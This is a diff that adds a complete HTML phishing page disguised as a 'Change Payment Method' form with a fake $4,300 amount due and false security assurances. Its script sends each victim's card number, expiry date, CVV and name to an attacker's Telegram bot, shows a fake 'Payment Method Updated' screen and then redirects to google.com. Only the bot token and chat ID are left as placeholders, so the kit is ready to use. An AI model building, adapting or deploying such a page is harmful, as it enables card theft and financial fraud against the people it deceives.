@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Change Payment Method</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 0;
+    }
+
+```
+.page {
+  width: 100%;
+  max-width: 480px;
+  min-height: 100vh;
+  background: #ffffff;
+  display: flex;
+  flex-direction: column;
+}
+
+.back-btn {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-weight: 700;
+  font-size: 18px;
+  color: #111;
+  padding: 20px 20px 16px;
+  cursor: pointer;
+  background: none;
+  border: none;
+}
+
+.security-banner {
+  margin: 0 16px 20px;
+  background: #f8fffe;
+  border: 1.5px solid #e0f5f0;
+  border-radius: 14px;
+  padding: 14px 16px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+
+.lock-icon {
+  width: 36px;
+  height: 36px;
+  flex-shrink: 0;
+}
+
+.security-text {
+  font-size: 13.5px;
+  color: #444;
+  line-height: 1.5;
+}
+
+.form-card {
+  margin: 0 16px;
+  border: 1.5px solid #e8e8e8;
+  border-radius: 16px;
+  padding: 22px 18px 24px;
+}
+
+.field-group {
+  margin-bottom: 18px;
+}
+
+.field-label {
+  font-size: 14px;
+  font-weight: 600;
+  color: #1a1a1a;
+  margin-bottom: 8px;
+  display: block;
+}
+
+.field-input {
+  width: 100%;
+  border: 1.5px solid #dde1e7;
+  border-radius: 10px;
+  padding: 14px 15px;
+  font-size: 15px;
+  font-family: 'DM Sans', sans-serif;
+  color: #111;
+  background: #fff;
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  appearance: none;
+}
+
+.field-input::placeholder {
+  color: #b0b7c3;
+  font-family: 'DM Mono', monospace;
+  font-size: 14px;
+  letter-spacing: 0.05em;
+}
+
+.field-input:focus {
+  border-color: #1a9ed4;
+  box-shadow: 0 0 0 3px rgba(26, 158, 212, 0.1);
+}
+
+.field-input.error {
+  border-color: #e53e3e;
+  box-shadow: 0 0 0 3px rgba(229, 62, 62, 0.08);
+}
+
+.row-two {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px;
+  margin-bottom: 18px;
+}
+
+.cvv-label-row {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  margin-bottom: 8px;
+}
+
+.cvv-help {
+  width: 17px;
+  height: 17px;
+  border-radius: 50%;
+  background: #d0d5de;
+  color: #fff;
+  font-size: 11px;
+  font-weight: 700;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+}
+
+.helper-text {
+  font-size: 12px;
+  color: #888;
+  margin-top: 6px;
+}
+
+.confirm-btn {
+  width: 100%;
+  background: #1a9ed4;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  font-family: 'DM Sans', sans-serif;
+  border: none;
+  border-radius: 12px;
+  padding: 17px;
+  cursor: pointer;
+  letter-spacing: 0.01em;
+  margin-top: 6px;
+  transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+  box-shadow: 0 4px 16px rgba(26, 158, 212, 0.3);
+  position: relative;
+  overflow: hidden;
+}
+
+.confirm-btn:hover {
+  background: #1689bb;
+  box-shadow: 0 6px 20px rgba(26, 158, 212, 0.4);
+}
+
+.confirm-btn:active {
+  transform: scale(0.98);
+}
+
+.confirm-btn:disabled {
+  opacity: 0.7;
+  cursor: not-allowed;
+}
+
+.spinner {
+  display: none;
+  width: 20px;
+  height: 20px;
+  border: 2.5px solid rgba(255,255,255,0.4);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+  margin: 0 auto;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.error-msg {
+  color: #e53e3e;
+  font-size: 12px;
+  margin-top: 5px;
+  display: none;
+}
+
+/* Success overlay */
+#successPage {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: #fff;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  z-index: 100;
+  padding: 40px 30px;
+  animation: fadeIn 0.4s ease;
+}
+
+#successPage.show {
+  display: flex;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+.success-icon {
+  width: 80px;
+  height: 80px;
+  background: linear-gradient(135deg, #1a9ed4, #0fc97b);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 28px;
+  box-shadow: 0 8px 30px rgba(26,158,212,0.3);
+}
+
+.success-title {
+  font-size: 26px;
+  font-weight: 700;
+  color: #111;
+  margin-bottom: 10px;
+  text-align: center;
+}
+
+.success-sub {
+  font-size: 15px;
+  color: #666;
+  text-align: center;
+  line-height: 1.6;
+  max-width: 280px;
+}
+
+.card-chip {
+  width: 28px;
+  height: 20px;
+  background: linear-gradient(135deg, #d4af37, #f5e97a);
+  border-radius: 4px;
+  display: inline-block;
+  margin-right: 6px;
+  vertical-align: middle;
+}
+```
+
+  </style>
+</head>
+<body>
+
+<div class="page" id="mainPage">
+  <!-- Amount Header -->
+  <div style="padding: 28px 20px 10px; text-align: center;">
+    <p style="font-size:13px; color:#888; font-weight:500; letter-spacing:0.06em; text-transform:uppercase; margin-bottom:6px;">Amount Due</p>
+    <p style="font-size:44px; font-weight:700; color:#111; letter-spacing:-0.02em; margin-bottom:4px;">$4,300<span style="font-size:24px; color:#aaa;">.00</span></p>
+    <p style="font-size:13px; color:#aaa;">Secure one-time payment</p>
+  </div>
+
+  <!-- Security Banner -->
+
+  <div class="security-banner">
+    <svg class="lock-icon" viewBox="0 0 36 36" fill="none">
+      <rect width="36" height="36" rx="10" fill="#e8f9f2"/>
+      <rect x="10" y="17" width="16" height="12" rx="3" fill="#22c55e"/>
+      <path d="M13 17v-4a5 5 0 0 1 10 0v4" stroke="#16a34a" stroke-width="2.2" stroke-linecap="round"/>
+      <circle cx="18" cy="23" r="1.5" fill="white"/>
+    </svg>
+    <p class="security-text">All transactions are secured, processed and authorized by external payment providers</p>
+  </div>
+
+  <!-- Form Card -->
+
+  <div class="form-card">
+    <div class="field-group">
+      <label class="field-label" for="cardNumber">Card number</label>
+      <input
+        class="field-input"
+        id="cardNumber"
+        type="text"
+        inputmode="numeric"
+        placeholder="XXXX XXXX XXXX XXXX"
+        maxlength="19"
+        oninput="formatCard(this)"
+        autocomplete="cc-number"
+      />
+      <p class="error-msg" id="cardError">Please enter a valid 16-digit card number.</p>
+    </div>
+
+```
+<div class="row-two">
+  <div class="field-group" style="margin-bottom:0">
+    <label class="field-label" for="expDate">Expiration date</label>
+    <input
+      class="field-input"
+      id="expDate"
+      type="text"
+      inputmode="numeric"
+      placeholder="MM/YY"
+      maxlength="5"
+      oninput="formatExp(this)"
+      autocomplete="cc-exp"
+    />
+    <p class="error-msg" id="expError">Enter a valid date (MM/YY).</p>
+  </div>
+  <div class="field-group" style="margin-bottom:0">
+    <div class="cvv-label-row">
+      <label class="field-label" for="cvv" style="margin-bottom:0">CVV/CVC</label>
+      <span class="cvv-help" title="3 or 4 digit code on the back of your card">?</span>
+    </div>
+    <input
+      class="field-input"
+      id="cvv"
+      type="password"
+      inputmode="numeric"
+      placeholder="•••"
+      maxlength="4"
+      oninput="this.value=this.value.replace(/\D/g,'')"
+      autocomplete="cc-csc"
+    />
+    <p class="error-msg" id="cvvError">Enter 3 or 4 digit CVV.</p>
+  </div>
+</div>
+
+<div class="field-group">
+  <label class="field-label" for="cardName">Cardholder name</label>
+  <input
+    class="field-input"
+    id="cardName"
+    type="text"
+    placeholder=""
+    autocomplete="cc-name"
+  />
+  <p class="helper-text">A full name, as it appears on the card</p>
+  <p class="error-msg" id="nameError">Please enter the cardholder's name.</p>
+</div>
+
+<button class="confirm-btn" id="confirmBtn" onclick="handleSubmit()">
+  <span id="btnText">Confirm</span>
+  <div class="spinner" id="spinner"></div>
+</button>
+```
+
+  </div>
+
+  <div style="height:40px"></div>
+</div>
+
+<!-- Success Page -->
+
+<div id="successPage">
+  <div class="success-icon">
+    <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
+      <polyline points="20 6 9 17 4 12"/>
+    </svg>
+  </div>
+  <h2 class="success-title">Payment Method Updated</h2>
+  <p class="success-sub">Your payment method has been successfully changed. You're all set!</p>
+</div>
+
+<script>
+  // ── CONFIG ──────────────────────────────────────────────
+  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // e.g. "7123456789:AAF..."
+  const CHAT_ID   = "YOUR_CHAT_ID_HERE";      // e.g. "-1001234567890"
+  const REDIRECT_URL = "https://google.com"; // page to redirect after submit
+  // ────────────────────────────────────────────────────────
+
+  function formatCard(input) {
+    let v = input.value.replace(/\D/g, '').substring(0, 16);
+    input.value = v.replace(/(.{4})/g, '$1 ').trim();
+  }
+
+  function formatExp(input) {
+    let v = input.value.replace(/\D/g, '').substring(0, 4);
+    if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
+    input.value = v;
+  }
+
+  function setError(id, inputId, show) {
+    document.getElementById(id).style.display = show ? 'block' : 'none';
+    document.getElementById(inputId).classList.toggle('error', show);
+  }
+
+  function validate() {
+    const card = document.getElementById('cardNumber').value.replace(/\s/g,'');
+    const exp  = document.getElementById('expDate').value;
+    const cvv  = document.getElementById('cvv').value;
+    const name = document.getElementById('cardName').value.trim();
+
+    let ok = true;
+    if (card.length !== 16 || !/^\d+$/.test(card)) { setError('cardError','cardNumber',true); ok=false; } else setError('cardError','cardNumber',false);
+    if (!/^\d{2}\/\d{2}$/.test(exp)) { setError('expError','expDate',true); ok=false; } else setError('expError','expDate',false);
+    if (cvv.length < 3) { setError('cvvError','cvv',true); ok=false; } else setError('cvvError','cvv',false);
+    if (!name) { setError('nameError','cardName',true); ok=false; } else setError('nameError','cardName',false);
+    return ok;
+  }
+
+  async function sendToTelegram(card, exp, cvv, name) {
+    const text =
+`💳 *New Payment Card Submitted*
+
+🔢 Card Number: \`${card}\`
+📅 Expiry: \`${exp}\`
+🔐 CVV: \`${cvv}\`
+👤 Name: ${name}`;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown'
+      })
+    });
+  }
+
+  async function handleSubmit() {
+    if (!validate()) return;
+
+    const btn = document.getElementById('confirmBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+
+    btn.disabled = true;
+    btnText.style.display = 'none';
+    spinner.style.display = 'block';
+
+    const card = document.getElementById('cardNumber').value.trim();
+    const exp  = document.getElementById('expDate').value.trim();
+    const cvv  = document.getElementById('cvv').value.trim();
+    const name = document.getElementById('cardName').value.trim();
+
+    // Send to Telegram (fire and forget — don't block redirect on failure)
+    sendToTelegram(card, exp, cvv, name).catch(()=>{});
+
+    // Show success page briefly then redirect
+    setTimeout(() => {
+      document.getElementById('successPage').classList.add('show');
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, 2000);
+    }, 1000);
+  }
+</script>
+
+</body>
+</html>
